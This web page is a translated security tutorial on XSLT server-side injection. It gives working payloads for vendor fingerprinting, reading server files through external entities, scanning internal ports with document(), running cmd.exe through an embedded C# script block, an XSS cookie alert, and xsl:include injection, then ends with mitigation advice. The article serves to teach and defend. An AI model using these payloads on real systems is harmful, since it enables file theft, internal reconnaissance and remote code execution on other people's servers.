<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>XSLT Web Vulnerability: Server Side Injection</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="XSL (Extensible Stylesheet Language) is a language for converting XML documents. XSLT means XSL Transformations. XSL Transformations are the XML docum...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>XSLT Web Vulnerability: Server Side Injection</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/f36/2d6/dfd/f362d6dfd0658f81a5b1dd56c3cb6286.jpg" alt="image"><br><p><br>  XSL (Extensible Stylesheet Language) is a language for converting XML documents.  XSLT means XSL Transformations.  XSL Transformations are the XML documents themselves.  The result of the conversion may be another XML document or something else, such as an HTML document, a CSV file, or a text file.  In this article I will discuss several attack vectors for XSLT. </p><a name="habracut"></a><br><p>  Vulnerabilities in the language of styles (XSLT) can have serious consequences for web applications, often leading to remote code execution (RCE).  Examples of XSLT vulnerabilities for remote code execution with publicly available exploits are CVE-2012-5357, CVE-2012-1592, CVE-2005-3757.  The examples above show that XSLT vulnerabilities have been known for quite some time, and, although they are less common than other similar vulnerabilities, such as XML Injection, they carry quite serious security risks. </p><br><h3>  Xslt </h3><br><p>  A common use of XSLT is the conversion of data between file formats processed by various applications, and also as a template engine.  Many business applications make extensive use of XSLT.  For example, we have an XML document with some elements, attributes, and values, but to work we need to move the elements, change the structure (for example, make an attribute an element) or perform additional calculations.  You can use the XSLT processor and convert the old document to a new look. </p><br><p>  This technology is often used for the following purposes: </p><br><ul><li>  reporting; </li><li>  export data in one format or another; </li><li>  print functions; </li><li>  sending messages. </li></ul><br><p>  The functionality of modern XSLT processors has a huge disadvantage: if they are not configured properly, XSLT processors can compromise a web application or allow arbitrary code to be executed. </p><br><p>  Data transformation example: We have an XML file that contains a list of fruits and relative descriptions: </p><br><pre><code class="plaintext hljs">&lt;?xml version="1.0" ?&gt; &lt;fruits&gt; &lt;fruit&gt; &lt;name&gt;Lemon&lt;/name&gt; &lt;description&gt;Yellow and sour&lt;/description&gt; &lt;/fruit&gt; &lt;fruit&gt; &lt;name&gt;Watermelon&lt;/name&gt; &lt;description&gt;Round, green outside, red inside&lt;/description&gt; &lt;/fruit&gt; &lt;/fruits&gt;</code> </pre> <br><p>  To convert an XML document to a text file, we can use the following XSL transformation: </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  As a result, we get a plain-text file: </p><br><pre> <code class="plaintext hljs">Fruits: - Lemon: Yellow and sour - Watermelon: Round, green outside, red inside</code> </pre> <br><h3>  XSLT Server Side Injection Operation </h3><br><p>  In the examples, we focus on a vulnerable application using Microsoft's System.Xml XSL;  however, similar methods apply to other common libraries, such as Libxslt, Saxon, and Xalan. </p><br><p>  The first step is to identify the vulnerable parameters of the application.  The simplest case is an application that allows you to load an arbitrary XSLT file. </p><br><p>  A preprocessor can generate an XML document dynamically using user input without proper validation (the field Your Company Name Here): </p><br><pre> <code class="plaintext hljs">&lt;?xml version=‚Äù1.0‚Äù encoding=‚Äùutf-8‚Äù?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; Your Company Name Here Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;xsl:include href="external_transform.xslt"/&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  To determine if an application is vulnerable, just enter characters that are usually invalid for the syntax of an XML document, such as double quotes, single quotes, and angle brackets.  If the server returns an error, the application is potentially vulnerable. </p><br><p>  Different libraries have different XSLT functions, and a function that is available in one library may not be available in another.  Proprietary extensions that are incompatible between libraries are often introduced.  In addition, the default settings vary widely between implementations, usually with older libraries, which have dangerous features enabled by default, and newer libraries that require developers to explicitly include them when necessary. </p><br><p>  The name of the library vendor can be obtained using the ‚Äúsystem-property ()‚Äù function, which is part of the XSLT v1.0 standard. </p><br><p>  The following transformation can be used to define a library "supplier": </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; &lt;xsl:value-of select="system-property('xsl:vendor')"/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  We are testing the Microsoft .Net System.xml implementation, so the return value is ‚ÄúMicrosoft‚Äù: </p><br><pre> <code class="plaintext hljs">Microsoft</code> </pre> <br><p>  The table shows the system-property handling of XSLT preprocessors: </p><br><p><img src="https://habrastorage.org/webt/59/d7/83/59d78349d5548413664708.png"></p><br><h3>  Reading arbitrary files and port scans </h3><br><p>  In the following example, we use an external object to read the contents of the file ‚ÄúC: \ secretfruit.txt‚Äù. </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; Fruits &amp;ext_file;: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  The ENTITY element places the contents of the file into an ‚Äúext_file‚Äù link, which we then print inside the main document, using ‚Äúext_file;‚Äù.  The output shows the secret contents of the file (Golden Apple): </p><br><pre> <code class="plaintext hljs">Fruits Golden Apple: - Lemon: Yellow and sour - Watermelon: Round, green outside, red inside</code> </pre> <br><p>  This method can be used to extract files stored locally on a web server, and web pages hosted on internal systems that would not normally be accessible to an attacker.  These can be configuration files containing credentials or files containing other sensitive information.  Files can also be extracted using UNC paths: \ servername \ share \ file and <a href="http://servername/file">http: // servername / file</a> . </p><br><p>  Using the list of IP addresses and port numbers, you can also determine whether the remote port is open or closed, depending on the response of the application.  For example, an application may display various error messages or contain time delays in the response. </p><br><p>  The following XSLT transformation uses the URL <a href="http://172.16.132.1:25/">http://172.16.132.1:25</a> instead of the local file path used in the previous example: </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; Fruits &amp;ext_file;: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  The following screenshot shows the error returned when trying to connect to a URL. </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/44a/f3b/08e/44af3b08e0a7a05676422484a8eccd1a.png" alt="image"></p><br><p>  The ‚Äúdocument ()‚Äù function can also be used to retrieve documents and to perform port scans: </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; &lt;xsl:copy-of select="document('http://172.16.132.1:25')"/&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><h3>  Remote code execution using embedded blocks </h3><br><p>  The built-in script blocks are proprietary XSLT extensions that allow code to be included directly in an XSLT document.  In Microsoft implementations, for example, C # code may be included.  When a document is analyzed, the code is compiled and executed by the remote server. </p><br><p>  The following XSLT document lists information about files in the current working directory: </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts"&gt; &lt;msxsl:script language = "C#" implements-prefix = "user"&gt; &lt;![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe"; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = "/c dir"; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match="/fruits"&gt; --- BEGIN COMMAND OUTPUT --- &lt;xsl:value-of select="user:execute()"/&gt; --- END COMMAND OUTPUT --- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  First, we define two new XML prefixes inside the "xsl: stylesheet" tag.  The first "xmlns: msxsl" is needed to enable proprietary Microsoft extensions, the second "xmlns: user" declares a user extension of the user, which is implemented by the script block "msxsl: script". </p><br><p>  The C # code implements the execute () function, which executes the cmd.exe / c dir command and returns the output of the command as a string.  Finally, the function is called inside the "xsl: value-of" tag. </p><br><p>  The result of the conversion is the output of the ‚Äúdir‚Äù command: </p><br><pre> <code class="plaintext hljs">--- BEGIN COMMAND OUTPUT --- Volume in drive C has no label. Volume Serial Number is EC7C-74AD Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole Application\XsltConsoleApplication\bin\Debug 22/02/2017 15:19 &lt;DIR&gt; . 22/02/2017 15:19 &lt;DIR&gt; .. 22/02/2017 13:30 258 data.xml 22/02/2017 14:48 233 external_transform.xslt 22/02/2017 15:15 12 secretfruit.txt 31/01/2017 13:45 154 secretfruit.xml 22/02/2017 15:29 831 transform.xslt 22/02/2017 13:49 7,168 XsltConsoleApplication.exe 26/01/2017 15:42 189 XsltConsoleApplication.exe.config 22/02/2017 13:49 11,776 XsltConsoleApplication.pdb 8 File(s) 20,621 bytes 2 Dir(s) 9,983,107,072 bytes free --- END COMMAND OUTPUT ---</code> </pre> <br><h3>  XSS operation </h3><br><p>  The following example shows the XSS vector exploitation in the template tag: </p><br><pre> <code class="plaintext hljs">&lt;xsl:stylesheet version=‚Äù1.0‚Ä≥ xmlns:xsl=‚Äùhttp://www.w3.org/1999/XSL/Transform‚Äù xmlns:php=‚Äùhttp://php.net/xsl‚Äù&gt; &lt;xsl:template match=‚Äù/‚Äù&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><h3>  Import functions </h3><br><p>  Application import and inclusion tags can be used to merge multiple XSLT documents. <br>  Import functions can be used to merge an XSLT document with an external document.  When an external file is loaded, the entire document is parsed, and if the attacker controls it, it can use both external external XML objects and embedded scripts in the external file. </p><br><p>  The ‚Äúxsl: import‚Äù tag can only be used as the first child of the ‚Äúxsl: stylesheet‚Äù tag, while the ‚Äúxsl: include‚Äù tag can be used in other positions. </p><br><pre> <code class="plaintext hljs">&lt;?xml version=‚Äù1.0‚Äù encoding=‚Äùutf-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; Your Company Name Here Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;xsl:include href="external_transform.xslt"/&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  We want to include the following external XSLT file named ‚Äúexternal_transform.xslt‚Äù with a message (Hello from the external transformation): </p><br><pre> <code class="plaintext hljs">&lt;?xml version=‚Äù1.0‚Äù encoding=‚Äùutf-8‚Äù?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/"&gt; Hello from the external transformation &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><p>  To include an external document, we need to use the following tag: </p><br><pre> <code class="plaintext hljs"> &lt;xsl: include href = "external_transform.xslt" /&gt;</code> </pre> <br><p>  There is one feature here: the ‚Äúxsl: include‚Äù tag cannot be included in the ‚Äúxsl: template‚Äù tag.  Therefore, we first need to close the ‚Äúxsl: template‚Äù tag, then we can add an ‚Äúxsl: include‚Äù tag that satisfies the first requirement.  To get a well-formed XML file, we need to re-open the ‚Äúxsl: template‚Äù tag after the ‚Äúxsl: include‚Äù tag. </p><br><pre> <code class="plaintext hljs">&lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt;</code> </pre> <br><p>  After injection injection, the resulting XSLT document looks as follows: </p><br><pre> <code class="plaintext hljs">&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt; &lt;xsl:template match="/fruits"&gt; &lt;/xsl:template&gt;&lt;xsl:include href="external_transform.xslt"/&gt;&lt;xsl:template name="a"&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select="fruit"&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;xsl:include href="external_transform.xslt"/&gt; &lt;/xsl:stylesheet&gt;</code> </pre> <br><h3>  Recommendations </h3><br><p>  If your application uses XSLT, you can reduce the risks by following these guidelines: <br>  If possible, avoid user-submitted XSLT documents. </p><br><p>  Do not generate XSLT documents with values ‚Äã‚Äãtransmitted from unreliable sources (inputs).  If a non-static value is required, it must be included in the XML data file and only referenced in an XSLT document. </p><br><p>  Disable the potentially dangerous functionality implemented by the XSLT library used.  Libraries often use unsafe defaults.  Check the library documentation to disable: external XML objects;  the ‚Äúdocument ()‚Äù function;  import and inclusion tags. </p><br><p>  Use protective filtering of the transmitted content. </p><br><p>  I also attach a table of potentially dangerous points of XSLT preprocessors used by default: </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5bd/325/789/5bd325789d4ca789e346f9a0e0c9582d.png" alt="image"></p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/339480/">https://habr.com/ru/post/339480/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../339470/index.html">Root worse Mikhalkov</a></li>
<li><a href="../339472/index.html">Large list of telegram channels for designers, product managers and analysts</a></li>
<li><a href="../339474/index.html">Testing in Openshift: Openstack Integration</a></li>
<li><a href="../339476/index.html">Let them in passwords</a></li>
<li><a href="../339478/index.html">GDG community at Google Developer Days</a></li>
<li><a href="../339482/index.html">How to kill your network with Ansible</a></li>
<li><a href="../339484/index.html">Traffic Sign Recognition Using CNN: Spatial Transformer Networks</a></li>
<li><a href="../339488/index.html">How to involve users in the gaming world: contests and interactivity in social networks. Cases of the Krasnodar studio Plarium</a></li>
<li><a href="../339490/index.html">Step-by-step instructions for creating an SMS web application using the SMS API from Infobip</a></li>
<li><a href="../339492/index.html">C / C ++ code optimization</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>